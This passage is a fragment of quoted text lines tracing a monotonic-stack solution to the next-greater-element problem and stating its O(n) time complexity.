    "  [7]: 7 > 3, result[2]=7. 7 > 5, result[1]=7. push 7. stack=[7]",
    "  [1]: 1 < 7, push. stack=[7,1]",
    "  End: remaining in stack get result -1",
    "",
    "Time: O(n) — each element pushed and popped at most once.",
